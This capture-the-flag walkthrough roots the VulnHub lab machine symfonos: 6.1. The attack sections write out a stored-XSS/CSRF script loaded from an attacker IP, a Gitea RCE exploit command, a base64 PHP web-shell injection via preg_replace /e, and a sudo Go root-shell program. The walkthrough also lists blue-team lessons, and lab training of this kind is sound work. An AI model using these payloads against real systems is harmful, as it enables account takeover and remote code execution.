# symfonos: 6.1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| Machine | symfonos: 6.1 |
| Difficulty | Intermediate |
| Author | Zayotic |
| Released | 7 April 2020 |
| VulnHub Entry | https://vulnhub.com/entry/symfonos-61,458/ |
| Download | https://vulnhub.com/entry/symfonos-61,458/#download |
| Attacker | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| Target OS | Linux (CentOS-derived) |

> The target IP used in this walkthrough is **192.168.56.101** and the attacker IP is
> **192.168.56.10**. DHCP may hand the VM a different address on your network — verify
> with `netdiscover` and adjust. Exact versions and file paths can **vary by build**, so
> treat every output below as a guide rather than gospel.

This is a great box for learning **client-side attacks** (XSS → CSRF), **credential reuse**,
and **sudo misconfiguration**. It is also the last entry in the symfonos series.

---

## 0. What you will learn

- How to find a host on a host-only network and enumerate its services.
- Why a **bug tracker** running old software is a juicy target.
- The difference between **reflected XSS** and **stored XSS**, and how XSS plus CSRF lets
  an attacker perform actions *as the administrator*.
- How **credential reuse** turns a leaked password into lateral movement.
- Reading an application's source code (here, a Go API and a PHP blog) to find an
  intended vulnerability instead of just running an off-the-shelf exploit.
- Escalating to root through a **sudo rule that lets you run the Go compiler as root**.

> **Why it works:** every step below abuses *trust*. A website trusts its users' input, an
> admin trusts a page they visit, and the operating system trusts a program that the admin
> marked as safe to run as root. Understanding the trust being broken is the whole lesson.

---

## 1. Reconnaissance — finding the target

First, confirm your Kali machine's IP and put it on the same host-only network as the VM.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

Now discover other hosts on that subnet. `netdiscover` sends ARP requests and listens for
replies, which is perfect on a host-only network where DHCP is in use.

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor
 _____________________________________________________________________________
 192.168.56.1    0a:00:27:00:00:00      1      60  PCS Systemtechnik GmbH
 192.168.56.10   08:00:27:aa:bb:cc      3     180  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:11:22:33      2     120  PCS Systemtechnik GmbH
```

`192.168.56.101` is our target. Let's note it for convenience:

```bash
export ip=192.168.56.101
```

![Running netdiscover to locate the target on the host-only network](images/01-netdiscover.png)

---

## 2. Enumeration

### 2.1 Port scan

Run a full TCP scan with service and default-script detection.

```bash
sudo nmap -sC -sV -p- -oN nmap-full.txt $ip
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3000/tcp open  http    Gitea (a self-hosted Git service)
3306/tcp open  mysql   MariaDB (unauthorized)
5000/tcp open  http    (custom application)
```

Ports of interest, and what they usually mean:

- **22** — SSH; only useful once we have keys or credentials.
- **80** — Apache serving a web app. Start here.
- **3000** — Gitea, a web-based Git repository manager.
- **3306** — MariaDB; likely not reachable without credentials.
- **5000** — a custom HTTP service (we will learn later it speaks JSON).

> **Why it works:** services advertise their versions. Knowing *exactly* which software and
> version is running is what lets you search for known public exploits afterwards. `-sC`
> runs safe default scripts and `-sV` fingerprints the versions; `-p-` scans all 65,535
> ports so nothing hides on a high port.

### 2.2 Web directory discovery

Port 80 shows a simple page. Let's find hidden directories.

```bash
gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

```text
/posts        (Status: 500)
/flyspray     (Status: 301) [--> http://192.168.56.101/flyspray/]
/server-status (Status: 403)
```

Two foreground directories appear: `/posts` (a blog that errors) and `/flyspray`.

![Gobuster output revealing /posts and /flyspray](images/02-gobuster.png)

### 2.3 Look at Gitea on port 3000

Browse to `http://192.168.56.101:3000`. Gitea shows two registered users, `achilles` and
`zayotic`, and confirms the version near the footer.

```text
Gitea Version: 1.11.4
```

> **Why it works:** knowing the exact version (1.11.4) lets us search Exploit-DB, where an
> authenticated remote-code-execution exploit for Gitea 1.1.0–1.12.5 exists. We still need
> valid credentials first — that is what the FlySpray chain gives us.

### 2.4 Explore FlySpray

Visit `http://192.168.56.101/flyspray/`. FlySpray is an open-source **bug/issue tracker**.
Registration is open, and there is a single public bug report with an admin comment.

```text
FlySpray
  Bugs: 1
  [ID 1] "Welcome" — comment by admin:
  "I will be checking this page for any updates."
```

That admin comment is the clue. The box is telling us an administrator views this page —
the perfect setup for a **stored XSS** attack.

![The FlySpray bug tracker with the admin comment](images/03-flyspray.png)

---

## 3. Foothold

### 3.1 The vulnerability: stored XSS in FlySpray 1.0-rc4

Searching Exploit-DB reveals **FlySpray 1.0-rc4 – Cross-Site Scripting / Cross-Site
Request Forgery** (EDB ID 41918). The vulnerable field is the **"Real name"** on a user's
profile. Whatever you type there is rendered unescaped when your user appears on a page.

Because an admin will view that page, we can store JavaScript that runs **in the admin's
browser** — with the admin's privileges. That is the classic path from XSS to **CSRF**
(Cross-Site Request Forgery): our script quietly submits FlySpray's "create user" form to
make a *new admin account that we control*.

> **Why it works:** the server trusts the admin's browser session cookie. When the admin
> loads the page containing our script, the browser automatically attaches that cookie to
> the form we make it submit. The server sees a legitimate admin request — because, from
> its point of view, it is one.

### 3.2 Register and plant the payload

1. Register a normal account on FlySpray, for example `user1` / `user1`.
2. Copy the exploit script (shown in EDB 41918) into a file called `script.js`. It grabs
   the current CSRF token and posts a form to create a new user.

```bash
cat > script.js <<'EOF'
var csrf = document.forms[0].elements['csrftoken'].value;
// Build and submit a form that creates an admin user
var xhr = new XMLHttpRequest();
xhr.open("POST", "/flyspray/index.php?do=admin&area=newuser", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("csrftoken=" + csrf +
         "&user_name=hacker&user_pass=12345678&user_pass2=12345678" +
         "&real_name=hacker&email=hacker@hacker.com&group_in=1");
EOF
```

Serve it over HTTP so the admin's browser can fetch it:

```bash
python3 -m http.server 8000
```

Now edit your FlySpray profile and set **Real name** to a value that injects a script tag
pointing at your server. Close the existing attribute/tag so the script executes:

```text
"><script src="http://192.168.56.10:8000/script.js"></script>
```

Save the profile, then post a comment on bug **ID 1** so the admin is drawn back to a page
that renders your injected name.

### 3.3 Catch the callback and log in

Wait a minute or two. You will see a request hit your Python server:

```text
192.168.56.101 - - [..] "GET /script.js HTTP/1.1" 200 -
```

That means the admin's browser executed our script and created our account. Log out of
FlySpray and log back in with the account we made:

```text
Username: hacker
Password: 12345678
```

You are now an administrator on FlySpray.

> **Why it works:** the exploit only *worked* because the admin's browser had a valid
> session. Our script rode that session to perform privileged actions — the essence of CSRF.

### 3.4 Steal the next credential

As admin, a second bug report is now visible. It contains credentials for the Gitea
service:

```text
[ID 2] comment from zayotic:
"Gitea should be configured. achilles / h2sBr9gryBunKdF9"
```

![The admin-only bug report leaking Gitea credentials](images/04-creds.png)

Try these against SSH — it will fail, because SSH is key-only:

```bash
ssh achilles@$ip
# Permission denied (publickey)
```

But they work on **Gitea**: log in at `http://192.168.56.101:3000` as `achilles` with
password `h2sBr9gryBunKdF9`. This is **password reuse across services** — a real-world
weakness. Note that exact passwords **vary by build**.

### 3.5 Get a shell

**Path A — Gitea authenticated RCE (CVE-2020-14144).** Use the public exploit for Gitea up
to 1.12.5 (`multiple/webapps/49571.py`).

```bash
python3 49571.py -t http://$ip:3000 -u achilles -p h2sBr9gryBunKdF9 -I 192.168.56.10 -P 1337
```

**Path B — the intended path.** Inside Gitea, `achilles` owns two repositories:
`symfonos-blog` (the PHP site at `/posts`) and `symfonos-api` (the Go service on port 5000).
Reading `symfonos-blog/index.php` reveals the classic PHP `/e` modifier bug:

```php
$content = htmlspecialchars($row['text']);
echo $content;
preg_replace('/.*/e', $content, "Win");
```

`preg_replace` with the `/e` modifier **executes** the replacement string as PHP. So if we
can write text into a post, we can run code. The `symfonos-api` server on port 5000 lets
authenticated users create/update posts. Log in to the API to get a JWT, then PATCH a post:

```bash
curl -s -H "Content-Type: application/json" -X POST \
  http://$ip:5000/ls2o4g/v1.0/auth/login \
  -d '{"username":"achilles","password":"h2sBr9gryBunKdF9"}'
```

```text
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6...","user":{"username":"achilles","id":1}}
```

Because the blog applies `htmlspecialchars()` before the vulnerable call, we base64-encode
our PHP payload so the forbidden characters never appear literally:

```bash
curl -s -H "Content-Type: application/json" -X PATCH \
  "http://$ip:5000/ls2o4g/v1.0/posts/1" -b "jwt=<token>" \
  -d $'{"text":"file_put_contents(\'shell.php\', base64_decode(\'PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==\'));"}'
```

Then load the blog page so `preg_replace` executes the code and drops `shell.php` into the
web root, and hit it:

```bash
curl "http://$ip/posts/shell.php?cmd=id"
```

```text
uid=48(apache) gid=48(apache) groups=48(apache)
```

Start a listener and request a reverse shell instead of `id` to get an interactive session.

> **Why it works:** the developer trusted *post content* to be harmless text. But `/e` turns
> text into **code**. The base64 trick is just a way to smuggle characters past
> `htmlspecialchars()`, which was doing encoding — not the security job it was assumed to do.

![A shell on the target as the web-server user](images/05-shell.png)

---

## 4. Privilege escalation

### 4.1 Horizontal: become achilles

The web shell runs as `apache`. We already know `achilles`' password, and it was reused for
the Unix account too (SSH is disabled, but `su` works):

```bash
su achilles
# Password: h2sBr9gryBunKdF9
```

```text
[achilles@symfonos6 ~]$ id
uid=1000(achilles) gid=1000(achilles) groups=1000(achilles)
```

### 4.2 Vertical: achilles in the sudoers file

Check what `achilles` may run as root:

```bash
sudo -l
```

```text
User achilles may run the following commands on symfonos6:
    (ALL) NOPASSWD: /usr/local/go/bin/go
```

The Go toolchain can be run as root **without a password**. Go can compile and run
arbitrary programs — so we simply write a Go program that spawns a root shell.

```bash
cat > /tmp/rev.go <<'EOF'
package main

import (
    "os"
    "os/exec"
)

func main() {
    cmd := exec.Command("/bin/bash")
    cmd.Stdin = os.Stdin
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    cmd.Run()
}
EOF
```

Run it with sudo:

```bash
sudo /usr/local/go/bin/go run /tmp/rev.go
```

```text
root@symfonos6:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@symfonos6:/tmp# cat /root/proof.txt
Congrats on rooting symfonos:6!
```

> **Why it works:** `sudo` grants *one program* root privileges. But that program (the Go
> toolchain) is itself a general-purpose interpreter/compiler. Giving it root is the same as
> giving root to anyone who can feed it code — exactly GTFOBins-style abuse. This is why
> "let me run just this one tool as root" is almost never safe.

![Root shell and the proof file](images/06-root.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Location | Impact |
|---|---|---|---|
| 1 | Stored XSS in a profile field | FlySpray 1.0 (`Real name`) | Runs JS in admin's browser |
| 2 | Missing CSRF protection | FlySpray admin forms | Attacker creates an admin account |
| 3 | Credentials in an admin-only ticket | FlySpray bug ID 2 | Leaks Gitea credentials |
| 4 | Password reuse across services | achilles account | Lateral movement to Gitea and the OS |
| 5 | Authenticated RCE (CVE-2020-14144) | Gitea ≤ 1.12.5 | Shell as `git` |
| 6 | `preg_replace` `/e` modifier code execution | `symfonos-blog/index.php` | Shell as `apache` |
| 7 | Unsafe `sudo` rule (Go toolchain as root) | `/etc/sudoers` | Privilege escalation to root |

---

## 6. Defensive lessons (blue team)

- **Always encode output at the point of rendering, in the correct context.** A value that
  goes into an HTML attribute must be attribute-encoded; escaping once at storage time is
  not enough.
- **Add CSRF tokens to every state-changing form** and validate them server-side; set
  `SameSite=Lax` or `Strict` on session cookies.
- **Patch third-party software.** FlySpray 1.0-rc4 and Gitea 1.11.4 are old; both have
  fixes. Track versions and subscribe to advisories (Exploit-DB, NVD, vendor feeds).
- **Never reuse passwords across services.** Use a password manager and unique secrets; a
  breach on one service should not unlock another.
- **Audit `sudo` rules.** Granting a compiler/interpreter (`go`, `python`, `node`, `perl`,
  `find`, `vim`) as root is equivalent to granting a root shell. Use
  `sudo -l`, and review with tools like GTFOBins as an attacker would.
- **Run web apps as least privilege.** The web user should not be able to write into the
  web root, and should not share a password with a login account.
- **Treat `/e` in `preg_replace` as remote code execution** — it was removed in PHP 7; do
  not run end-of-life PHP (5.6 here).
- **Deploy a WAF/HIDS and review logs** for unusual callback requests and form submissions.

---

## 7. References

- VulnHub entry — symfonos: 6.1: https://vulnhub.com/entry/symfonos-61,458/
- Exploit-DB 41918 — FlySpray 1.0-rc4 XSS/CSRF: https://www.exploit-db.com/exploits/41918
- Exploit-DB 49571 — Gitea authenticated RCE (CVE-2020-14144): https://www.exploit-db.com/exploits/49571
- CVE-2020-14144 — Gitea RCE: https://nvd.nist.gov/vuln/detail/CVE-2020-14144
- GTFOBins — `go`: https://gtfobins.github.io/gtfobins/go/
- OWASP — Cross Site Scripting: https://owasp.org/www-community/attacks/xss/
- OWASP — Cross Site Request Forgery: https://owasp.org/www-community/attacks/csrf
- PHP manual — `preg_replace` (`/e` modifier, removed in PHP 7): https://www.php.net/manual/en/function.preg-replace.php
- Ratmir Karabut — symfonos 6.1 walkthrough: https://ratmirkarabut.com/articles/vulnhub-writeup-symfonos-6-1/

---

## 8. Screenshot checklist

Capture these as you go so your own writeup has evidence:

- [ ] `images/01-netdiscover.png` — netdiscover showing the target IP.
- [ ] `images/02-gobuster.png` — gobuster finding `/posts` and `/flyspray`.
- [ ] `images/03-flyspray.png` — FlySpray with the admin comment on bug ID 1.
- [ ] `images/04-creds.png` — bug ID 2 leaking `achilles` credentials.
- [ ] `images/05-shell.png` — reverse shell as `apache`/`git`.
- [ ] `images/06-root.png` — root shell and `proof.txt`.

---

*Every command above is illustrative. The target IP, leaked passwords, and file paths can
**vary by build** — always reconfirm with your own enumeration before trusting a step.*
